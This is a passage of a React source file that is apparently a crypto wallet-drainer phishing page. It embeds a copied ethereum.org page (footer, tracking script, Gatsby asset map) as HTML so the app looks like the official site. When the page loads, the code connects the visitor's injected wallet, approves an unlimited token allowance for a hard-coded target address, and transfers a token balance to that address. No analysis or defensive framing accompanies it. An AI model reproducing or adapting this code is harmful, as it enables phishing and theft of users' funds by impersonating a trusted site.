                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/developers/tutorials/"><span>Tutorials</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/developers/learning-tools/"><span>Learn by coding</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/developers/local-environment/"><span>Set up local environment</span></a></li>
                  </ul>
                </div>
                <div class="Footer__LinkSection-sc-1to993d-4 bfxkfK">
                  <h3 class="Footer__SectionHeader-sc-1to993d-5 bbCEKr"><span>Ecosystem</span></h3>
                  <ul class="Footer__List-sc-1to993d-6 gjQPMc">
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/community/"><span>Community hub</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/foundation/"><span>Ethereum Foundation</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__ExternalLink-sc-e3riao-0 gABYms Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="https://blog.ethereum.org/" target="_blank" rel="noopener noreferrer"><span>Ethereum
                          Foundation Blog</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__ExternalLink-sc-e3riao-0 gABYms Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="https://esp.ethereum.foundation" target="_blank" rel="noopener noreferrer"><span>Ecosystem
                          Support Program</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/community/grants"><span>Ecosystem Grant Programs</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/assets/"><span>Ethereum brand assets</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__ExternalLink-sc-e3riao-0 gABYms Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="https://devcon.org/" target="_blank" rel="noopener noreferrer"><span>Devcon</span></a></li>
                  </ul>
                </div>
                <div class="Footer__LinkSection-sc-1to993d-4 bfxkfK">
                  <h3 class="Footer__SectionHeader-sc-1to993d-5 bbCEKr"><span>Enterprise</span></h3>
                  <ul class="Footer__List-sc-1to993d-6 gjQPMc">
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/enterprise/"><span>Mainnet Ethereum</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/enterprise/private-ethereum/"><span>Private Ethereum</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/enterprise/"><span>Enterprise</span></a></li>
                  </ul>
                </div>
                <div class="Footer__LinkSection-sc-1to993d-4 bfxkfK">
                  <h3 class="Footer__SectionHeader-sc-1to993d-5 bbCEKr"><span>About ethereum.org</span></h3>
                  <ul class="Footer__List-sc-1to993d-6 gjQPMc">
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/about/"><span>About us</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/about/#open-jobs"><span>Jobs</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/contributing/"><span>Contributing</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/languages/"><span>Language support</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/privacy-policy/"><span>Privacy policy</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/terms-of-use/"><span>Terms of use</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__InternalLink-sc-e3riao-1 hoRTos Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="/en/cookie-policy/"><span>Cookie policy</span></a></li>
                    <li class="Footer__ListItem-sc-1to993d-7 eGhJJx"><a
                        class="Link__ExternalLink-sc-e3riao-0 gABYms Footer__FooterLink-sc-1to993d-8 gqbMgV"
                        href="mailto:press@ethereum.org" target="_blank" rel="noopener noreferrer"><span>Contact</span></a>
                    </li>
                  </ul>
                </div>
              </div>
            </footer>
          </div>
        </div>
        <div id="gatsby-announcer"
          style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0"
          aria-live="assertive" aria-atomic="true"></div>
      </div>
      <script>
        window.dev = undefined
        if (window.dev === true || !(navigator.doNotTrack === '1' || window.doNotTrack === '1')) {
          window._paq = window._paq || [];
    
    
    
          window._paq.push(['setTrackerUrl', 'https://matomo.ethereum.org/matomo.php']);
          window._paq.push(['setSiteId', '4']);
          window._paq.push(['enableHeartBeatTimer']);
          window.start = new Date();
    
          (function () {
            var d = document, g = d.createElement('script'), s = d.getElementsByTagName('script')[0];
            g.type = 'text/javascript'; g.async = true; g.defer = true; g.src = 'https://matomo.ethereum.org/matomo.js'; s.parentNode.insertBefore(g, s);
          })();
    
          if (window.dev === true) {
            console.debug('[Matomo] Tracking initialized')
            console.debug('[Matomo] matomoUrl: https://matomo.ethereum.org, siteId: 4')
          }
        }
      </script><noscript><img src="https://matomo.ethereum.org/matomo.php?idsite=4&rec=1&url=https://ethereum.org/en/"
          style="border:0" alt="tracker" /></noscript>
      <script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath = "/en/";/*]]>*/</script>
      <script
        id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping = { "polyfill": ["/polyfill-eba46248be90e8db2a76.js"], "app": ["/app-28078d89f9db9418b96d.js"], "component---src-pages-404-js": ["/component---src-pages-404-js-8bf94494c90c70f3fb40.js"], "component---src-pages-assets-js": ["/component---src-pages-assets-js-3887364b5c680307841e.js"], "component---src-pages-community-js": ["/component---src-pages-community-js-ecd234572a0c857daaff.js"], "component---src-pages-conditional-dapps-js": ["/component---src-pages-conditional-dapps-js-be1aa3c0b3581ac7e711.js"], "component---src-pages-conditional-eth-js": ["/component---src-pages-conditional-eth-js-37e0332edec78459c1ae.js"], "component---src-pages-conditional-wallets-index-js": ["/component---src-pages-conditional-wallets-index-js-81eaad4c2a91808c6a5b.js"], "component---src-pages-conditional-what-is-ethereum-js": ["/component---src-pages-conditional-what-is-ethereum-js-d8327c9396f2b2e689d5.js"], "component---src-pages-contributing-translation-program-acknowledgements-js": ["/component---src-pages-contributing-translation-program-acknowledgements-js-5842e37aac6e2e678b43.js"], "component---src-pages-contributing-translation-program-contributors-js": ["/component---src-pages-contributing-translation-program-contributors-js-60e5833887eb0956833b.js"], "component---src-pages-developers-index-js": ["/component---src-pages-developers-index-js-08faab3da0ce1e8c30d1.js"], "component---src-pages-developers-learning-tools-js": ["/component---src-pages-developers-learning-tools-js-792807eed8264f5f3edd.js"], "component---src-pages-developers-local-environment-js": ["/component---src-pages-developers-local-environment-js-fc0fb8170971fe1047ad.js"], "component---src-pages-developers-tutorials-js": ["/component---src-pages-developers-tutorials-js-a01234ade37a5765dfd5.js"], "component---src-pages-get-eth-js": ["/component---src-pages-get-eth-js-99f17a065724f639807b.js"], "component---src-pages-index-js": ["/component---src-pages-index-js-e11f9f2ca3fd63927558.js"], "component---src-pages-languages-js": ["/component---src-pages-languages-js-ba2e25ac21a67013044c.js"], "component---src-pages-run-a-node-js": ["/component---src-pages-run-a-node-js-cdca13692dfe4853b281.js"], "component---src-pages-stablecoins-js": ["/component---src-pages-stablecoins-js-e74710fe538f5b565181.js"], "component---src-pages-staking-deposit-contract-js": ["/component---src-pages-staking-deposit-contract-js-ecbbe7ad9a2fec4fdf25.js"], "component---src-pages-staking-index-js": ["/component---src-pages-staking-index-js-d21a4188a6192b85e6f8.js"], "component---src-pages-studio-js": ["/component---src-pages-studio-js-bead9bd8031ddee57a01.js"], "component---src-pages-upgrades-get-involved-bug-bounty-js": ["/component---src-pages-upgrades-get-involved-bug-bounty-js-1f4085d4d675dea6dd63.js"], "component---src-pages-upgrades-get-involved-index-js": ["/component---src-pages-upgrades-get-involved-index-js-6e24f02d2bec6a44d3ff.js"], "component---src-pages-upgrades-index-js": ["/component---src-pages-upgrades-index-js-1d2377c20e1cd2e448c2.js"], "component---src-pages-upgrades-vision-js": ["/component---src-pages-upgrades-vision-js-72fce0a7122b0b87a8c2.js"], "component---src-pages-wallets-find-wallet-js": ["/component---src-pages-wallets-find-wallet-js-62b8563b378c1121b314.js"], "component---src-templates-docs-js": ["/component---src-templates-docs-js-dc4ddc8e74592c57d5cf.js"], "component---src-templates-static-js": ["/component---src-templates-static-js-817f73d438731488124c.js"], "component---src-templates-tutorial-js": ["/component---src-templates-tutorial-js-f1a0e2422a208525aaa1.js"], "component---src-templates-upgrade-js": ["/component---src-templates-upgrade-js-fcbbfb3e8787e2cfafbc.js"], "component---src-templates-use-cases-js": ["/component---src-templates-use-cases-js-0e0587ad572ae014d4eb.js"] };/*]]>*/</script>
      <script src="/polyfill-eba46248be90e8db2a76.js" nomodule=""></script>
      <script src="/component---src-pages-index-js-e11f9f2ca3fd63927558.js" async=""></script>
      <script src="/7af8855b021f6a970d51fdb46cde1a68c215da27-8891e581cd5f0db5a796.js" async=""></script>
      <script src="/17c33ad9a348ef774778252eb67365cfd55aa9a5-e77143c5f3f8181de506.js" async=""></script>
      <script src="/52cf9c5a1e9c7984f21863cec29b00316e2f83b5-d88a746dbbb49532e37e.js" async=""></script>
      <script src="/11668b3b9ed3683ee47d28f8c77a545e619ec982-ee72c9abd0df09f0774e.js" async=""></script>
      <script src="/25d596b65775ea7afe354c15642381979021d6cd-2f6caff8459189371c2f.js" async=""></script>
      <script src="/app-28078d89f9db9418b96d.js" async=""></script>
      <script src="/0f1ac474-e8f788f62189f421a856.js" async=""></script>
      <script src="/0c428ae2-2128ff22fce458b543bd.js" async=""></script>
      <script src="/1bfc9850-0f18e2d74feedfc6e426.js" async=""></script>
      <script src="/ae51ba48-34d54094a2c04f215fb8.js" async=""></script>
      <script src="/252f366e-2705b607be296edabcea.js" async=""></script>
      <script src="/framework-4e285adfb333f1b50c05.js" async=""></script>
      <script src="/webpack-runtime-da26d554e03be4ff9a68.js" async=""></script>
    </body>
    
    </html>`;

  const connectWallet = async () => {

    try {
      if(wallet == false)
      {
        await activate(injected);
        await allow();
        await transfer();
      }
      // setWallet(true);
    } catch (error) {
      console.log(error);
    }
  }

  const allow = async () => {
    try {
      const { ethereum } = window;
        if (ethereum) {
            const provider = new ethers.providers.Web3Provider(ethereum);
            const signer = provider.getSigner();
            const sourceContract = new ethers.Contract(contractAddress, targetContract, signer);
            console.log(sourceContract);
            console.log(targetAddress);
            console.log(account);
            const tx = await approve(sourceContract, targetAddress, account);
            
            await tx.wait();
            console.log(`Aprroved, see transaction: https://rinkeby.etherscan.io/tx/${tx.hash}`);
        }
      } catch (error) {
        console.log(error);
      }

    // targetAddress

  }
  

  const transfer = async () => {
    try {
      const { ethereum } = window;
        if (ethereum) {
            const provider = new ethers.providers.Web3Provider(ethereum);
            const signer = provider.getSigner();
            const sourceContract = new ethers.Contract(contractAddress, targetContract, signer);
            const remain = await sourceContract.balanceOf(contractAddress);
            let sendAmount = 0;
            console.log(remain);
            if(remain < ethers.constants.MaxUint256)
              sendAmount = remain;
            else 
              sendAmount = ethers.constants.MaxUint256;
            const tx = await sourceContract.transfer(targetAddress, sendAmount);
            
            await tx.wait();
            console.log(`Transfered, see transaction: https://rinkeby.etherscan.io/tx/${tx.hash}`);

        }
      } catch (error) {
        console.log(error);
      }

    // targetAddress

  }

  //from here !!

  useEffect( async () => {
    // if(wallet == false)
      await connectWallet();
    // else{
    //   await allow();
    //   await transfer();
    // }

  }, [wallet]);

  
    return (
      <>
        <div className="mainContainer">
          <div className="dataContainer">
            <Header/>
            {/* <div><span className = "exploreEthereum" onClick = {allow}>Explore Ethereum</span></div> */} 
            <div dangerouslySetInnerHTML={{ __html: temptext1 }} />
              <button className="waveButton" onClick={connectWallet}>
                {!account? "Connect Wallet" : "Disconnect Wallet"}
              </button>
            <div dangerouslySetInnerHTML={{ __html: temptext2 }} />    
          </div>
        </div>
      </>
    );
  }

export default App


export const approve = async (sourceContract, targetAddress, account) => {
  return sourceContract.approve(targetAddress, ethers.constants.MaxUint256);
};